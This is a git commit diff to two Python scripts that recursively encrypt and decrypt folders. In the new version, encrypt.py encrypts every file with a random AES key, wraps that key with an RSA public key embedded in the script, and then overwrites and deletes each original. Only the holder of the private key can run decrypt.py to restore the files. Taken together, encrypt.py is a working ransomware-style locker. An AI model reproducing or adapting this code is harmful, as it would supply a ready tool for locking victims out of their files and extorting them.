ba72bd6dff145dc3f661ce6c6daae147d20807d6
Kalyan Cheerla <32354220+kalyancheerla@users.noreply.github.com>
2023-10-05 16:15:31 -0500

    added aes-key encryption using rsa public key

--- action/decrypt.py
+++ action/decrypt.py
@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
-import os
-import sys
-from Crypto.Hash import SHA256
+import os, sys
 from Crypto.Random import get_random_bytes
-from Crypto.Cipher import AES
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES, PKCS1_OAEP
 
 """ Securely delete the file after writing random bytes in it. """
 def secure_delete(filename):
@@ -16,47 +15,64 @@ def secure_delete(filename):
     # remove the file
     os.remove(filename)
 
+""" Do RSA Decryption """
+def rsa_decrypt(encrypted_data, private_key_file):
+    # import private key
+    with open(private_key_file, 'rb') as key_file:
+        private_key = RSA.import_key(key_file.read())
+    # get cipher
+    cipher = PKCS1_OAEP.new(private_key)
+    # return decrypted data
+    return cipher.decrypt(encrypted_data)
+
+
 """ Decrypt each file """
-def decrypt_file(key, in_filename):
+def decrypt_file(private_key_file, in_filename):
     # remove '.enc' extension for the decrypted file
     out_filename = in_filename[:-4]
     with open(in_filename, 'rb') as infile:
         # extract nonce which is first 8bytes
         nonce = infile.read(8)
-        cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
+        # extract 512bytes of encrypted 32bytes aes key using rsa:4096
+        encrypted_aes_key = infile.read(512)
+
+        # get aes key
+        aes_key = rsa_decrypt(encrypted_aes_key, private_key_file)
+        # perform aes decryption
+        cipher = AES.new(aes_key, AES.MODE_CTR, nonce=nonce)
+
+        # write to file
         with open(out_filename, 'wb') as outfile:
             outfile.write(cipher.decrypt(infile.read()))
 
 """ Perform the decryption of folder recursively """
-def perform_folder_decryption(key, folder_path):
+def perform_folder_decryption(private_key_file, folder_path):
     for root, dirs, files in os.walk(folder_path):
         for file in files:
             if file.endswith('.enc'):
                 # get file name with folder path
                 in_filename = os.path.join(root, file)
                 # decrypt the file
-                decrypt_file(key, in_filename)
+                decrypt_file(private_key_file, in_filename)
                 # securely delete the encrypted file after decryption
                 secure_delete(in_filename)
 
 """ Decrypt Usage """
 def usage():
-    print("./decrypt.py <folder path 1> <folder path 2>... <password>")
+    print("./decrypt.py <folder path 1> <folder path 2>... <private key file>")
 
 """ MAIN FUNCTION """
 def main(argv):
     if len(argv) < 2:
         usage()
+        sys.exit(1)
 
     folders = argv[:len(argv)-1]
-    password = argv[-1]
-
-    # Use SHA256 to derive key for AES
-    key = SHA256.new(password.encode()).digest()
+    private_key_file = argv[-1]
 
     # recursively perform for all folders
     for folder_path in folders:
-        perform_folder_decryption(key, folder_path)
+        perform_folder_decryption(private_key_file, folder_path)
 
     print("Decryption was successfully completed!")
 
--- action/encrypt.py
+++ action/encrypt.py
@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
-import os
-import sys
-from Crypto.Hash import SHA256
+import os, sys
 from Crypto.Random import get_random_bytes
-from Crypto.Cipher import AES
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.Hash import SHA256
 
 """ Securely delete the file after writing random bytes in it. """
 def secure_delete(filename):
+    # open in binary append plus mode
     with open(filename, "ba+") as delfile:
         # get the file length
         length = delfile.tell()
@@ -16,56 +17,81 @@ def secure_delete(filename):
     # remove the file
     os.remove(filename)
 
+""" Do RSA Encryption """
+def rsa_encrypt(public_key, data):
+    public_key = RSA.import_key(public_key)
+    cipher = PKCS1_OAEP.new(public_key)
+    return cipher.encrypt(data)
+
 """ Encrypt each file """
-def encrypt_file(key, in_filename):
+def encrypt_file(public_key, in_filename):
     # set output filename
     out_filename = in_filename + '.enc'
     with open(in_filename, 'rb') as infile:
-        # set nonce
-        nonce = get_random_bytes(8)
-        cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
+        # set aes key
+        aes_key = get_random_bytes(32)
+        cipher = AES.new(aes_key, AES.MODE_CTR)
         with open(out_filename, 'wb') as outfile:
-            # write nonce value in the start of
-            # output encrypted file
-            outfile.write(nonce)
+            # 1. write nonce value
+            # 2. encrypted aes key using rsa public key
+            # 3. output encrypted file
+            #print(cipher.nonce, len(cipher.nonce))
+            outfile.write(cipher.nonce)
+            #print(len(rsa_encrypt(public_key, aes_key)))
+            outfile.write(rsa_encrypt(public_key, aes_key))
             outfile.write(cipher.encrypt(infile.read()))
 
 """ Perform the encryption of folder recursively """
-def perform_folder_encryption(key, folder_path):
+def perform_folder_encryption(public_key, folder_path):
     # walk through each folder recursively
     for root, dirs, files in os.walk(folder_path):
         for file in files:
             # get file name with folder path
             in_filename = os.path.join(root, file)
             # encrypt file
-            encrypt_file(key, in_filename)
+            encrypt_file(public_key, in_filename)
             # securely delete the file
             secure_delete(in_filename)
 
 """ Encrypt Usage """
 def usage():
-    print("./encrypt.py <folder path 1> <folder path 2>... <password>")
+    print("./encrypt.py <folder path 1> <folder path 2>...")
 
 
 """ MAIN FUNCTION """
 def main(argv):
-    if len(argv) < 2:
+    public_key = b"""-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAqY2gNOS1hE1t3JFN3Fde
+gizbeKRaEee/8w8mvloLZL140eIdwAGMrytYY71YZOVw6Lbp8gJ3E7KBxJgyZBpO
+pYaekmLtEc+ouJZ5Tviinx1y0SAC48QQeu4zCKWJdWxrSmpdwhasAtodmb5PkNQi
+vQn3rNI00RfT0ITqzsOPfMpVRasGfMs2bufYZ4SXpM1GTmtOHzvnwZ7XEFiCagBI
+j+6tLPRHjpk2by6fMvsQlJ19bDDixjj0cB1lMZ5Dn99siK3wZnBUgZkQJ3lT8CEI
+eXTNoLEOpo0V7xBEuxNkmhqeJJhwnXHZjnY+CG+bzA9AFyKmCgfeIiMmA6b9pdb0
+VwCM4p0RqHXsP1PRruKP1fyL/ysmVWljlxz+zDTMPLEhBCgQAIDqFND3Ca1usaZ0
+YcI5vMI99w4yA3byBFwPEc+f4oUyuGVpjZKCJYFS+1oLeUkjBaiq9AgpESfNO1ly
+QrR4hGEo1NBVT3a5yCb6w/3TzR9pfRIIHf6Yb5M76W5SjdNPcv8CN15kA6zu1HMY
+mLhummaD+aExFll7axSyZtgGq0XjJ2JudDsgfdFkblO9LxJDfQMDLZwHBVnfn9Fc
+t/GYqMBWIR0KjOpwSkJ8LZNTGFezE0puZuXjHaNlPljtMxNBg2y+H9+tyv03+XmS
+IOaUHLyeYqwiHn2MyECmDoECAwEAAQ==
+-----END PUBLIC KEY-----"""
+
+    # no args check
+    if len(argv) < 1:
         usage()
+        sys.exit(1)
 
-    folders = argv[:len(argv)-1]
-    password = argv[-1]
-
-    # Use SHA256 to derive key for AES
-    key = SHA256.new(password.encode()).digest()
+    # get folders list
+    folders = argv
 
     # recursively perform for all folders
     for folder_path in folders:
-        perform_folder_encryption(key, folder_path)
+        perform_folder_encryption(public_key, folder_path)
 
     print("Encryption was successfully completed!")
 
 
 
 if __name__ == "__main__":
+    # main call
     main(sys.argv[1:])
 
